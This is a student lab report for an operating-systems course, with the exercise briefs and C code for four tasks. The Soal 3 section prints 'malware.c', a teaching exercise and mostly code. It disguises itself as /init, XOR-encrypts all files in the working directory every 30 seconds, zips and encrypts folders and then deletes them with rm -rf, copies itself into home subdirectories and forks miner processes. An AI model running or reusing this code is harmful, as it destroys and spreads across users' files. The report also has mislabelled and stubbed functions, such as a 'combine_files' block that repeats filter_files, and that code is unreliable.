# SISOP-1-2024-IT36

Anggota Kelompok
|     Nrp    |                Nama              |
|-----       | -----                            |
|5027241106  | Mohammad Abyan Ranuaji           |
|5027241078  | Naila Raniyah Hanan              |


- [Peraturan](#peraturan)
- [Soal](#soal)
  - [Soal 1](#soal-1)
  - [Soal 2](#soal-2)
  - [Soal 3](#soal-3)
  - [Soal 4](#soal-4)
 
---
## Peraturan
---
1. Waktu pengerjaan dimulai hari Senin (7 April 2025) setelah sesi lab hingga hari Sabtu (12 April 2025) pukul 23.59 WIB.
2. Praktikan diharapkan membuat laporan penjelasan dan penyelesaian soal dalam 3. bentuk Readme(github).
3. Format nama repository github “Sisop-[Nomor Modul]-2025-[Nama Kelompok]” (contoh:Sisop-2-2025-IT01).
4. Struktur repository seperti berikut:
   - **soal_1:**
     - `action.c`
   - **soal_2:**
     - `starterkit.c`
   - **soal_3:**
     - `malware.c`
   - **soal_4:**
     - `debugmon.c`
     
Jika melanggar struktur repo akan dianggap sama dengan curang dan menerima konsekuensi sama dengan melakukan kecurangan. Folder assets bersifat opsional dan hanya diisi dengan dokumentasi pengerjaan yang akan diletakkan di readme. Tidak ada format khusus untuk penamaan file dalam assets.

5. Setelah pengerjaan selesai, semua script bash, awk, dan file yang berisi cron job ditaruh di github masing - masing kelompok, dan link github diletakkan pada form yang disediakan. Pastikan github di setting ke publik.
6. Commit terakhir maksimal 10 menit setelah waktu pengerjaan berakhir. Jika melewati maka akan dinilai berdasarkan commit terakhir.
7. Jika tidak ada pengumuman perubahan soal oleh asisten, maka soal dianggap dapat diselesaikan.
8. Jika ditemukan soal yang tidak dapat diselesaikan, harap menuliskannya pada Readme beserta permasalahan yang ditemukan.
9.  Praktikan tidak diperbolehkan menanyakan jawaban dari soal yang diberikan kepada asisten maupun praktikan dari kelompok lainnya.
10. Jika ditemukan indikasi kecurangan dalam bentuk apapun di pengerjaan soal shift, maka nilai dianggap 0.
11. Pengerjaan soal shift sesuai dengan modul yang telah diajarkan.
12. Zip dari repository dikumpulkan di google form yang terdapat pada linktree.
13. Jika terdapat revisi soal akan dituliskan pada halaman terakhir.

---
## Soal
---
1. Kamu terbangun secara tiba-tiba di suatu lokasi yang tidak diketahui, saat kamu melihat sekitar yang terlihat hanyalah kegelapan dan sebuah pintu dengan dua mata berwarna yang melihatmu dari lubang pintu tersebut.
Ia merupakan naga bernama Cyrus yang menjaga pintu tersebut dan kamu harus meng-input password yang benar untuk masuk. Karena tidak mungkin untuk menebak password, Ia memberikanmu sebuah clue Clues.zip. Untungnya, kamu merupakan Directory Lister yang jago sehingga clue ini dapat berubah menjadi sebuah password.

  a. Downloading the Clues

Karena kamu telah diberikan sebuah link Clues oleh Cyrus, kamu membuat file bernama action.c yang dimana kalau dijalankan seperti biasa tanpa argumen tambahan akan mendownload dan meng-unzip file tersebut secara langsung. Saat kamu melihat isi dari Clues tersebut, isinya berupa 4 folder yakni ClueA - ClueD dan di masing-masing folder tersebut terdapat .txt files dan isinya masih tidak jelas, mungkin beberapa kata di dalam .txt file yang dapat dicari di inventory website? (Note: inventory bersifat untuk seru-seruan saja).  Jangan lupa untuk menghapus Clues.zip setelah diekstrak dan buatlah apabila folder Clues sudah ada, maka command tersebut tidak akan mendownload Clues.zip lagi apabila dijalankan.

  b. Filtering the Files

Karena kebanyakan dari file tersebut berawal dengan 1 huruf atau angka, kamu pun mencoba untuk memindahkan file-file yang hanya dinamakan dengan 1 huruf dan 1 angka tanpa special character kedalam folder bernama Filtered. Kamu tidak suka kalau terdapat banyak clue yang tidak berguna jadi disaat melakukan filtering, file yang tidak terfilter dihapus. Karena kamu tidak ingin membuat file kode lagi untuk filtering, maka kamu menggunakan file sebelumnya untuk filtering file-file tadi dengan menambahkan argumen saat ingin menjalankan action.c

Contoh penggunaan:
puro@furo:~$ ./action -m Filter

Struktur directory setelah filter:

  ![Image](https://github.com/user-attachments/assets/e19b4622-0805-4810-b38a-22999c67ec7d)

  c. Combine the File Content

Di setiap file .txt yang telah difilter terdapat satu huruf dan agar terdapat progress, Cyrus memberikan clue tambahan untuk meletakan/redirect isi dari setiap .txt file tersebut kedalam satu file yaitu Combined.txt dengan menggunakan FILE pointer. Tetapi, terdapat urutan khusus saat redirect isi dari .txt tersebut, yaitu urutannya bergantian dari .txt dengan nama angka lalu huruf lalu angka lagi lalu huruf lagi. Lalu semua file .txt sebelumnya dihapus. Seperti halnya tadi, agar efisien kamu ingin menjalankan action.c dengan argumen tambahan.

Contoh urutan:
1.txt
a.txt
2.txt
b.txt
dst..

Contoh penggunaan:
puro@furo:~$ ./action -m Combine

Struktur directory setelah combine:

  ![Image](https://github.com/user-attachments/assets/819b46c6-9f6e-4e5d-9643-eeffcef91da4)

  d. Decode the File

Karena isi Combined.txt merupakan string yang random, kamu 
memiliki ide untuk menggunakan Rot13 untuk decode string tersebut dan meletakan hasil dari yang telah di-decode tadi kedalam file bernama Decoded.txt. Jalankan file action.c dengan argumen tambahan untuk proses decoding ini. 

Contoh penggunaan:
puro@furo:~$ ./action -m Decode

  e. Password Check

Karena kamu sudah mendapatkan password tersebut, kamu mencoba untuk mengecek apakah password yang sudah kamu dapatkan itu benar atau tidak dengan cara di-input ke lokasi tadi.

Berikut contoh struktur directory akhir:

  ![Image](https://github.com/user-attachments/assets/ab2c0b71-a8ab-431e-aa12-fd979c20ac54)

Notes: Berikan error handling yakni memberi tahu command yang benar jika salah argumen.


2. Ada seorang perempuan nolep yang bernama Kanade Yoisaki. Beliau adalah siswi SMA yang mengambil kelas online (tipsen dulu ygy) karena malas sekali untuk keluar rumah. Sebagai gantinya, ia bekerja sebagai seorang composer dan hanya tinggal di dalam rumah saja untuk membuat musik secara terus - menerus. Berkat usahanya, musik ciptaan Kanade pun mulai terkenal dan akhirnya Kanade pun membuat sebuah grup musik bernama 25-ji, Nightcord de., atau yang biasa dikenal dengan N25 atau Niigo.

   Pada suatu hari, Kanade ingin membuat sebuah musik baru beserta dengan anggota grup musik lainnya, yaitu Mizuki Akiyama, Mafuyu Asahina, dan Ena Shinonome. Namun sialnya, komputer Kanade terkena sebuah virus yang tidak diketahui. Setelah dianalisis oleh Kanade sendiri, ternyata virus ini bukanlah sebuah trojan, ransomware, maupun tipe virus berbahaya lainnya, melainkan hanya sebuah malware biasa yang hanya bisa membuat sebuah perangkat menjadi lebih lambat dari biasanya.

  a. Sebagai teman yang baik, Mafuyu merekomendasikan Kanade untuk mendownload dan unzip sebuah starter kit berisi file - file acak (sudah termasuk virus) melalui link berikut agar dapat membantu Kanade dalam mengidentifikasi virus - virus yang akan datang. Jangan lupa untuk menghapus file zip asli setelah melakukan unzip.

  b. Setelah mendownload starter kit tersebut, Mafuyu ternyata lupa bahwa pada starter kit tersebut, tidak ada alat untuk mendecrypt nama dari file yang diencrypt menggunakan algoritma Base64. Oleh karena itu, bantulah Mafuyu untuk membuat sebuah directory karantina yang dapat mendecrypt nama file yang ada di dalamnya (Hint: gunakan daemon).
  
Penggunaan:
./starterkit --decrypt

  c. Karena Kanade adalah orang yang sangat pemalas (kecuali jika membuat musik), maka tambahkan juga fitur untuk memindahkan file yang ada pada directory starter kit ke directory karantina, dan begitu juga sebaliknya.
  
Penggunaan:
./starterkit --quarantine (pindahkan file dari directory starter kit ke karantina)
./starterkit --return (pindahkan file dari directory karantina ke starter kit)

  d. Ena memberikan ide kepada mereka untuk menambahkan fitur untuk menghapus file - file yang ada pada directory karantina. Mendengar ide yang bagus tersebut, Kanade pun mencoba untuk menambahkan fitur untuk menghapus seluruh file yang ada di dalam directory karantina.
  
Penggunaan:
./starterkit --eradicate 

  e. Karena tagihan listrik Kanade sudah membengkak dan tidak ingin komputernya menyala secara terus - menerus, ia ingin program decrypt nama file miliknya dapat dimatikan secara aman berdasarkan PID dari proses program tersebut.
  
Penggunaan:
./starterkit --shutdown

  f. Mafuyu dan Kanade juga ingin program mereka dapat digunakan dengan aman dan nyaman tanpa membahayakan penggunanya sendiri, mengingat Mizuki yang masih linglung setelah keluar dari labirin Santerra De Laponte. Oleh karena itu, tambahkan error handling sederhana untuk mencegah penggunaan yang salah pada program tersebut.

  g. Terakhir, untuk mencatat setiap penggunaan program ini, Kanade beserta Mafuyu ingin menambahkan log dari setiap penggunaan program ini dan menyimpannya ke dalam file bernama activity.log.
  
Format:
Decrypt: 
[dd-mm-YYYY][HH:MM:SS] - Successfully started decryption process with PID <pid>.

Quarantine:
[dd-mm-YYYY][HH:MM:SS] - <nama file> - Successfully moved to quarantine directory.

Return:
[dd-mm-YYYY][HH:MM:SS] - <nama file> - Successfully returned to starter kit directory.

Eradicate:
[dd-mm-YYYY][HH:MM:SS] - <nama file> - Successfully deleted.

Shutdown:
[dd-mm-YYYY][HH:MM:SS] - Successfully shut off decryption process with PID <pid>.


Contoh struktur akhir directory untuk soal ini adalah sebagai berikut.

  ![Image](https://github.com/user-attachments/assets/fce6706f-b0b8-4f3b-a8de-e5fcedecdb50)

3. Dok dok dorokdok dok rodok. Anomali malware yang dikembangkan oleh Andriana di PT Mafia Security Cabang Ngawi yang hanya keluar di malam pengerjaan soal shift modul 2. Konon katanya anomali ini akan mendatangi praktikan sisop yang tidak mengerjakan soal ini. Ihh takutnyeee.

  a. Malware ini bekerja secara daemon dan menginfeksi perangkat korban dan menyembunyikan diri dengan mengganti namanya menjadi /init.

  b. Anak fitur pertama adalah sebuah encryptor bernama wannacryptor yang akan memindai directory saat ini dan mengenkripsi file dan folder (serta seluruh isi folder) di dalam directory tersebut menggunakan xor dengan timestamp saat program dijalankan. Encryptor pada folder dapat bekerja dengan dua cara, mengenkripsi seluruh isi folder secara rekursif, atau mengubah folder dan isinya ke dalam zip lalu mengenkripsi zip tersebut. Jika menggunakan metode rekursif, semua file di dalam folder harus terenkripsi , dari isi folder paling dalam sampai ke current directory, dan tidak mengubah struktur folder Jika menggunakan metode zip, folder yang dienkripsi harus dihapus oleh program. Pembagian metode sebagai berikut: Untuk kelompok ganjil menggunakan metode rekursif, dan kelompok genap menggunakan metode zip.

  c. Anak fitur kedua yang bernama trojan.wrm berfungsi untuk menyebarkan malware ini kedalam mesin korban dengan cara membuat salinan binary malware di setiap directory yang ada di home user.

  d. Anak fitur pertama dan kedua terus berjalan secara berulang ulang selama malware masih hidup dengan interval 30 detik.

  e. Anak fitur ketiga ini sangat unik. Dinamakan rodok.exe, proses ini akan membuat sebuah fork bomb di dalam perangkat korban.

  f. Konon katanya malware ini dibuat oleh Andriana karena dia sedang memerlukan THR. Karenanya, Andriana menambahkan fitur pada fork bomb tadi dimana setiap fork dinamakan mine-crafter-XX (XX adalah nomor dari fork, misal fork pertama akan menjadi mine-crafter-0) dan tiap fork akan melakukan cryptomining. Cryptomining disini adalah membuat sebuah hash hexadecimal (base 16) random sepanjang 64 char. Masing masing hash dibuat secara random dalam rentang waktu 3 detik - 30 detik. Sesuaikan jumlah maksimal mine-crafter dengan spesifikasi perangkat, minimal 3 (Jangan dipaksakan sampai lag, secukupnya saja untuk demonstrasi)

  g. Lalu mine-crafter-XX dan mengumpulkan hash yang sudah dibuat dan menyimpannya di dalam file /tmp/.miner.log dengan format: 
[YYYY-MM-DD hh:mm:ss][Miner XX] hash, Dimana XX adalah ID mine-crafter yang membuat hash tersebut.

  ![Image](https://github.com/user-attachments/assets/1cca1dee-bf7c-4a09-943b-a5772ebb0e1f)

  h. Karena mine-crafter-XX adalah anak dari rodok.exe, saat rodok.exe dimatikan, maka seluruh mine-crafter-XX juga akan mati. 

Nama anak anak diatas adalah nama proses yang akan berjalan. Mengganti nama proses berarti saat dilakukan pemeriksaan proses berjalan (seperti ps aux dan lainnya), maka proses tersebut akan muncul dengan nama yang ditentukan.

  ![Image](https://github.com/user-attachments/assets/d1a5fd6c-04ed-49b7-a625-fd0199d9e72e)

Perhatikan hubungan ppid dan pid dari process-process tersebut

Disarankan untuk meng-compile program dengan nama runme. Command ini dapat digunakan jika ingin menghapus file yang terbuat oleh fungsi multiply:

find ~ -name "runme" -type f -delete

PERINGATAN: Karena program ini berpotensi membahayakan perangkat praktikan, buatlah sebuah folder kosong baru di directory home dan gunakan folder di dalam zip ini untuk memperagakan sub soal c (contoh program diletakkan di /home/user/new-folder/test atau /tmp/sisop/test dengan test adalah folder yang sudah di-extract dari zip tersebut). Disarankan untuk menggunakan isolated environment (seperti VM) saat menjalankan soal ini. Jangan jalankan program ini di dalam directory vital seperti “/home/user”, “/” dll. Setelah selesai menjalankan program ini, pastikan semua process yang dibuat sudah mati.

4. Suatu hari, Nobita menemukan sebuah alat aneh di laci mejanya. Alat ini berbentuk robot kecil dengan mata besar yang selalu berkedip-kedip. Doraemon berkata, "Ini adalah Debugmon! Robot super kepo yang bisa memantau semua aktivitas di komputer!" Namun, alat ini harus digunakan dengan hati-hati. Jika dipakai sembarangan, bisa-bisa komputer Nobita malah error total! 😱

  a. Mengetahui semua aktivitas user
   
Doraemon ingin melihat apa saja yang sedang dijalankan user di komputernya. Maka, dia mengetik:

./debugmon list <user>

Debugmon langsung menampilkan daftar semua proses yang sedang berjalan pada user tersebut beserta PID, command, CPU usage, dan memory usage.

  b. Memasang mata-mata dalam mode daemon
  
Doraemon ingin agar Debugmon terus memantau user secara otomatis. Doraemon pun menjalankan program ini secara daemon dan melakukan pencatatan ke dalam file log dengan menjalankan:

./debugmon daemon <user>

  c. Menghentikan pengawasan

User mulai panik karena setiap gerak-geriknya diawasi! Dia pun memohon pada Doraemon untuk menghentikannya dengan:

./debugmon stop <user>

  d. Menggagalkan semua proses user yang sedang berjalan
  
Doraemon yang iseng ingin mengerjai user dengan mengetik:

./debugmon fail <user>

Debugmon langsung menggagalkan semua proses yang sedang berjalan dan menulis status proses ke dalam file log dengan status FAILED. Selain menggagalkan, user juga tidak bisa menjalankan proses lain dalam mode ini.

  e. Mengizinkan user untuk kembali menjalankan proses
  
Karena kasihan, Shizuka meminta Doraemon untuk memperbaiki semuanya. Doraemon pun menjalankan:

./debugmon revert <user>

Debugmon kembali ke mode normal dan bisa menjalankan proses lain seperti biasa.

  f. Mencatat ke dalam file log
  
Sebagai dokumentasi untuk mengetahui apa saja yang debugmon lakukan di komputer user, debugmon melakukan pencatatan dan penyimpanan ke dalam file debugmon.log untuk semua proses yang dijalankan dengan format

[dd:mm:yyyy]-[hh:mm:ss]_nama-process_STATUS(RUNNING/FAILED)

Untuk poin b, c, dan e, status proses adalah RUNNING. Sedangkan untuk poin d, status proses adalah FAILED.


### Soal 1

  ## Script action.c

a.) Header dan Include Library
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <dirent.h>
#include <ctype.h>
#include <fcntl.h>
```
  - #include directives: Mengimpor library yang diperlukan untuk:
    - Operasi I/O (stdio.h), manajemen memori (stdlib.h), dan manipulasi string (string.h).
    - System calls (unistd.h), manajemen proses (sys/wait.h), dan direktori (dirent.h).
    - Pengecekan tipe karakter (ctype.h) dan operasi file (fcntl.h).

b.) Deklarasi Fungsi
```
void download_and_extract();
void filter_files();
void combine_files();
void decode_file();
void show_usage(char *program_name);
int is_directory_exists(const char *path);
int is_file_exists(const char *path);
void execute_command(char *argv[]);
```
  - Fungsi Utama
    - download_and_extract(): Unduh dan ekstrak file Clues.zip.
    - filter_files(): Filter file dengan format nama tertentu.
    - combine_files(): Gabungkan file yang sudah difilter.
    - decode_file(): Dekode isi file menggunakan ROT13.

  - Fungsi Pendukung
    - is_directory_exists(): Cek keberadaan direktori.
    - is_file_exists(): Cek keberadaan file.
    - execute_command(): Eksekusi perintah shell.
    - show_usage(): Tampilkan petunjuk penggunaan.

c.) Fungsi main
```
int main(int argc, char *argv[]) {
    if (argc == 1) {
        download_and_extract();
    } else if (argc == 3 && strcmp(argv[1], "-m") == 0) {
        if (strcmp(argv[2], "Filter") == 0) {
            filter_files();
        } else if (strcmp(argv[2], "Combine") == 0) {
            combine_files();
        } else if (strcmp(argv[2], "Decode") == 0) {
            decode_file();
        } else {
            show_usage(argv[0]);
        }
    } else {
        show_usage(argv[0]);
    }
    return 0;
}
```
  - Jika tidak ada argumen (argc == 1), jalankan download_and_extract().
  - Jika ada argumen -m diikuti mode (Filter, Combine, Decode), panggil fungsi sesuai mode.
  - Jika argumen tidak valid, tampilkan petunjuk penggunaan.

d.) Fungsi download_and_extract
```
void download_and_extract() {
    if (is_directory_exists("Clues")) {
        printf("Clues directory already exists. Skipping download.\n");
        return;
    }
    // Download Clues.zip
    char *wget_args[] = {"wget", "URL", "-O", "Clues.zip", NULL};
    execute_command(wget_args);
    // Ekstrak dan hapus zip
    char *unzip_args[] = {"unzip", "Clues.zip", NULL};
    execute_command(unzip_args);
    char *rm_args[] = {"rm", "Clues.zip", NULL};
    execute_command(rm_args);
}
```
  - Download dan ekstrak clues.zip
  - Cek apakah direktori Clues sudah ada.
  - Gunakan wget untuk mengunduh file.
  - Ekstrak dengan unzip dan hapus file zip.

e.) Fungsi filter_files
```
void filter_files() {
    if (!is_directory_exists("Clues")) {
        printf("Clues directory missing. Run without arguments first.\n");
        return;
    }
    mkdir("Filtered", 0755);
    // Iterasi file di subdirektori Clues
    // Filter file dengan format: [a-zA-Z0-9].txt
    // Salin file yang memenuhi kriteria ke direktori Filtered
}
```
  - Filter file dengan format nama X.txt (X = huruf/angka).
  - Cek direktori Clues.
  - Buat direktori Filtered.
  - Salin file yang memenuhi kriteria.

f.) Fungsi combine_files
```
void filter_files() {
    if (!is_directory_exists("Clues")) {
        printf("Clues directory missing. Run without arguments first.\n");
        return;
    }
    mkdir("Filtered", 0755);
}
```
  - Gabungkan file yang sudah difilter secara bergantian (huruf-angka).
  - Cek direktori Filtered.
  - Gabungkan isi file dengan urutan: A.txt, 1.txt, B.txt, 2.txt, dst.

g.) Fungsi decode_file
```
void decode_file() {
    if (!is_file_exists("Combined.txt")) {
        printf("Combined.txt missing. Run combine mode first.\n");
        return;
    }
    // Baca Combined.txt, terapkan ROT13 (geser huruf 13 posisi).
    // Simpan hasil ke Decoded.txt.
}
```
  - Dekode isi Combined.txt menggunakan algoritma ROT13.
  - Menggeser setiap huruf sebanyak 13 posisi misal A ke N, dan lain lain.

h.) Fungsi Pendukung
```
int is_directory_exists(const char *path) {
    struct stat st;
    return (stat(path, &st) == 0 && S_ISDIR(st.st_mode));
}

void execute_command(char *argv[]) {
    pid_t pid = fork();
    if (pid == 0) execvp(argv[0], argv);  // Eksekusi di child process
    else waitpid(pid, NULL, 0);           // Tunggu child selesai
}
```
  - is_directory_exists: Cek apakah path adalah direktori.
  - execute_command: Jalankan perintah shell menggunakan fork() dan execvp().

i.) Fungsi show_usage
```
void show_usage(char *program_name) {
    printf("Usage:\n");
    printf("  %s                  : Download and extract Clues.zip\n", program_name);
    printf("  %s -m Filter        : Filter files\n", program_name);
    printf("  %s -m Combine       : Combine files\n", program_name);
    printf("  %s -m Decode        : Decode with ROT13\n", program_name);
}
```
  - Tampilkan cara penggunaan program.





### Soal 2**
a&b. mendowload, unzip sebuah file acak dan menghapus file zip asli setelah melakukan unzip.& mendecrypt nama file yang ada di dalamnya.
```
 void download_zip() {
     printf("[*] Downloading ZIP...\n");
     char *argv[] = {
         "wget", "--no-check-certificate", "-q",
         "-O", (char *)ZIP_FILE,
         (char *)("https://drive.google.com/uc?export=download&id=" FILE_ID),
         NULL
     };
     run_command(argv);
 }
 
 void unzip_file() {
     printf("[*] Unzipping ZIP...\n");
     char *mkdir_argv[] = { "mkdir", "-p", (char *)EXTRACT_DIR, NULL };
     run_command(mkdir_argv);
 
     char *unzip_argv[] = { "unzip", "-o", (char *)ZIP_FILE, "-d", (char *)EXTRACT_DIR, NULL };
     run_command(unzip_argv);
 }
 
 void delete_zip() {
     printf("[*] Deleting ZIP file...\n");
     char *rm_argv[] = { "rm", "-f", (char *)ZIP_FILE, NULL };
     run_command(rm_argv);
 }
 int base64_char(char c) {
     if ('A' <= c && c <= 'Z') return c - 'A';
     if ('a' <= c && c <= 'z') return c - 'a' + 26;
     if ('0' <= c && c <= '9') return c - '0' + 52;
     if (c == '+') return 62;
     if (c == '/') return 63;
     return -1;
 }
 
 int base64_decode(const char *input, unsigned char *output) {
     int len = strlen(input);
     int out_len = 0, val = 0, valb = -8;
 
     for (int i = 0; i < len; i++) {
         if (input[i] == '=') break;
         int c = base64_char(input[i]);
         if (c == -1) return -1;
         val = (val << 6) + c;
         valb += 6;
         if (valb >= 0) {
             output[out_len++] = (val >> valb) & 0xFF;
             valb -= 8;
         }
     }
     output[out_len] = '\0';
     return out_len;
 }
 
  void decrypt_and_move_files() {
     mkdir(QUARANTINE_DIR, 0755);
 
     DIR *dir = opendir(EXTRACT_DIR);
     if (!dir) exit(EXIT_FAILURE);
 
     struct dirent *entry;
     char src_path[512], dst_path[512];
     unsigned char decoded[256];
 
     while ((entry = readdir(dir)) != NULL) {
         if (entry->d_type != DT_REG) continue;
 
         int len = strlen(entry->d_name);
         if (len % 4 != 0) continue;
 
         int valid = 1;
         for (int i = 0; i < len; i++) {
             char c = entry->d_name[i];
             if (!(isalnum(c) || c == '+' || c == '/' || c == '=')) {
                 valid = 0;
                 break;
             }
         }
         if (!valid) continue;
 
         snprintf(src_path, sizeof(src_path), "%s/%s", EXTRACT_DIR, entry->d_name);
         int out_len = base64_decode(entry->d_name, decoded);
         if (out_len <= 0) continue;
 
         if (decoded[out_len - 1] == '\n') decoded[out_len - 1] = '\0';
 
         snprintf(dst_path, sizeof(dst_path), "%s/%s", QUARANTINE_DIR, decoded);
         rename(src_path, dst_path);
     }
 
     closedir(dir);
 }
 
```
![Screenshot 2025-04-18 220752](https://github.com/user-attachments/assets/9e4002f1-43b0-4c8a-a22e-de24ca131a38)
![Screenshot 2025-04-18 220807](https://github.com/user-attachments/assets/ccb7e456-d31d-424a-995d-b88b61934514)

c.memindahkan file yang ada pada directory starter kit ke directory karantina, dan begitu juga sebaliknya.
```
 void move_files(const char *src_dir, const char *dst_dir) {
     mkdir(dst_dir, 0755);
 
     DIR *src = opendir(src_dir);
     if (!src) {
         fprintf(stderr, "[!] Source directory '%s' not found.\n", src_dir);
         return;
     }
 
     struct dirent *entry;
     char src_path[512], dst_path[512], log_msg[1024];
 
     while ((entry = readdir(src)) != NULL) {
         if (entry->d_type != DT_REG) continue;
 
         snprintf(src_path, sizeof(src_path), "%s/%s", src_dir, entry->d_name);
         snprintf(dst_path, sizeof(dst_path), "%s/%s", dst_dir, entry->d_name);
 
         if (rename(src_path, dst_path) == 0) {
             snprintf(log_msg, sizeof(log_msg),
                      "%s - Successfully moved to %s directory.",
                      entry->d_name,
                      strcmp(dst_dir, QUARANTINE_DIR) == 0 ? "quarantine" : "starter kit");
             write_log(log_msg);
         }
     }
 
     closedir(src);
 }
 
 
 void quarantine_files() {
     move_files(EXTRACT_DIR, QUARANTINE_DIR);
 }
 
```
![Screenshot 2025-04-18 221108](https://github.com/user-attachments/assets/4c040db4-57b6-488d-95bb-97c7e91b2023)
![Screenshot 2025-04-18 221224](https://github.com/user-attachments/assets/eb217164-0baf-48b5-9278-c354c88693c5)

d. menghapus seluruh file yang ada di dalam directory karantina.
```
 void return_files() {
     move_files(QUARANTINE_DIR, EXTRACT_DIR);
 }
 void eradicate_files() {
     DIR *dir = opendir(QUARANTINE_DIR);
     if (!dir) {
         fprintf(stderr, "[!] Cannot open quarantine directory\n");
         return;
     }
 
     struct dirent *entry;
     char path[512], log_msg[1024];
 
     while ((entry = readdir(dir)) != NULL) {
         if (entry->d_type != DT_REG) continue;
 
         snprintf(path, sizeof(path), "%s/%s", QUARANTINE_DIR, entry->d_name);
         if (remove(path) == 0) {
             snprintf(log_msg, sizeof(log_msg), "%s - Successfully deleted.", entry->d_name);
             write_log(log_msg);
         }
     }
 
     closedir(dir);
 }
 
```
![Screenshot 2025-04-18 221833](https://github.com/user-attachments/assets/4bb299ff-c3c2-496e-bf35-98ce086d2937)

e.mamatikan secara aman berdasarkan PID dari proses program tersebut.
```
 void shutdown_daemon() {
     FILE *fp = fopen(PID_FILE, "r");
     if (!fp) {
         fprintf(stderr, "[!] PID file not found. Daemon might not be running.\n");
         return;
     }
 
     pid_t pid;
     fscanf(fp, "%d", &pid);
     fclose(fp);
 
     if (kill(pid, SIGTERM) == 0) {
         char msg[128];
         snprintf(msg, sizeof(msg), "Successfully shut off decryption process with PID %d.", pid);
         write_log(msg);
         remove(PID_FILE);
     } else {
         perror("[!] Failed to kill daemon");
     }
 }
```
![Screenshot 2025-04-18 222836](https://github.com/user-attachments/assets/d889038d-44ec-442b-ab23-1e5fa26b8bda)

f.mbahkan error handling sederhana untuk mencegah penggunaan yang salah pada program tersebut.
```
 
 void print_usage() {
     printf("Usage:\n");
     printf("  ./starterkit                 : Download & setup starter kit\n");
     printf("  ./starterkit --decrypt       : Jalankan daemon untuk mendekripsi nama file terenkripsi\n");
     printf("  ./starterkit --shutdown      : Hentikan daemon decrypt\n");
     printf("  ./starterkit --quarantine    : Pindahkan file dari starter_kit ke karantina\n");
     printf("  ./starterkit --return        : Pindahkan file dari karantina ke starter_kit\n");
     printf("  ./starterkit --eradicate     : Hapus seluruh file di direktori karantina\n");
 }
 } else {
         fprintf(stderr, "[!] Invalid argument: %s\n", argv[1]);
         print_usage();
```
![Screenshot 2025-04-18 223134](https://github.com/user-attachments/assets/3e4474db-f1ed-4d3a-9a09-d7a1f7dec3a9)

g.menambahkan log dari setiap penggunaan program ini dan menyimpannya ke dalam file bernama activity.log.
```
 void write_log(const char *message) {
     FILE *fp = fopen(LOG_FILE, "a");
     if (!fp) return;
 
     time_t now = time(NULL);
     struct tm *t = localtime(&now);
     char timestamp[32];
     strftime(timestamp, sizeof(timestamp), "[%d-%m-%Y][%H:%M:%S]", t);
 
     fprintf(fp, "%s - %s\n", timestamp, message);
     fclose(fp);
 }
```
![Screenshot 2025-04-18 223930](https://github.com/user-attachments/assets/82778fe2-086b-4b70-b1ac-64f0206e4fba)

 # revisi 
 -Successfully deleted.
 ![Screenshot 2025-04-18 225045](https://github.com/user-attachments/assets/236fe565-2d28-4de7-a041-7575a71251f4)

### Soal 3

  ## Script malware.c

a.) Fungsi XOR File
```
void xor_file(const char *filename, int key) {
    FILE *f = fopen(filename, "rb+");
    if (!f) return;

    int c;
    long pos = 0;
    while ((c = fgetc(f)) != EOF) {
        fseek(f, pos, SEEK_SET);
        fputc(c ^ key, f);
        pos++;
    }
    fclose(f);
}
```
  - Fungsi ini bertugas untuk mengenkripsi atau mendekripsi file menggunakan metode XOR.
    - filename: Nama file yang akan diproses.
    - key: Kunci enkripsi (integer).

  - Membuka file dalam mode baca/tulis biner.
  - Membaca setiap karakter (fgetc) dan mengenkripsinya dengan operasi XOR (c ^ key).
  - Menulis kembali karakter hasil XOR ke file (fputc).

b.) Fungsi Zip dan Enkripsi Folder
```
void zip_and_encrypt(const char *folderpath, int key) {
    char zipname[512];
    snprintf(zipname, sizeof(zipname), "%s.zip", folderpath);
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "zip -r -q '%s' '%s'", zipname, folderpath);
    system(cmd);
    xor_file(zipname, key);
    char delcmd[512];
    snprintf(delcmd, sizeof(delcmd), "rm -rf '%s'", folderpath);
    system(delcmd);
}
```
  - Membuat nama arsip zip berdasarkan nama folder.
  - Mengeksekusi perintah zip dengan system.
  - Mengenkripsi file zip menggunakan fungsi xor_file.
  - Menghapus folder asli menggunakan perintah rm.

c.) Fungsi Enkripsi File
```
void encrypt_file(const char *filepath, int key) {
    xor_file(filepath, key);
}
```
  - Fungsi ini hanya memanggil fungsi xor_file untuk mengenkripsi file tertentu.

d.) Fungsi WannaCryptor
```
void run_wannacryptor() {
    DIR *d = opendir(".");
    if (!d) return;

    time_t t = time(NULL);
    int key = (int)t;
    struct dirent *entry;
    while ((entry = readdir(d)) != NULL) {
        if (!strcmp(entry->d_name, "runme") || !strcmp(entry->d_name, "malware")) continue;
        if (entry->d_type == DT_REG) {
            encrypt_file(entry->d_name, key);
        } else if (entry->d_type == DT_DIR) {
            if (strcmp(entry->d_name, ".") && strcmp(entry->d_name, "..")) {
                zip_and_encrypt(entry->d_name, key);
            }
        }
    }
    closedir(d);
}
```
  - Membuka direktori saat ini dengan opendir.
  - Membaca setiap entri di dalam direktori.
  - Mengenkripsi file reguler menggunakan encrypt_file.
  - Membuat arsip .zip untuk folder, lalu mengenkripsinya menggunakan zip_and_encrypt.

e.) Fungsi Trojan
```
void run_trojan() {
    char *home = getenv("HOME");
    if (home)
        scan_and_copy(home);
}
```
  - Mendapatkan path ke direktori HOME.
  - Memindai semua subdirektori dan menyalin file malware ke dalamnya.

f.) Fungsi Rodok (Miner)
```
void run_rodok() {
    for (int i = 0; i < MAX_MINERS; ++i) {
        pid_t pid = fork();
        if (pid == 0) {
            miner_process(i);
            exit(0);
        }
    }
    while (wait(NULL) > 0);
}
```
  - Membuat sejumlah proses anak (maksimal MAX_MINERS).
  - Setiap proses anak menjalankan fungsi miner_process.

g.) Fungsi Utama
```
int main() {
    prctl(PR_SET_NAME, "/init", 0, 0, 0);

    pid_t pid = fork();
    if (pid == 0) {
        prctl(PR_SET_NAME, "wannacryptor");
        while (1) {
            run_wannacryptor();
            sleep(30);
        }
    }

    pid = fork();
    if (pid == 0) {
        prctl(PR_SET_NAME, "trojan.wrm");
        while (1) {
            run_trojan();
            sleep(30);
        }
    }

    pid = fork();
    if (pid == 0) {
        prctl(PR_SET_NAME, "rodok.exe");
        run_rodok();
        exit(0);
    }

    while (1) sleep(1000);
    return 0;
}
```
  - Fungsi utama menjalankan tiga proses:
    - wannacryptor: Mengenkripsi file di direktori.
    - trojan.wrm: Menyalin malware ke direktori pengguna.
    - rodok.exe: Menjalankan proses mining palsu.

  - Langkah kerja:
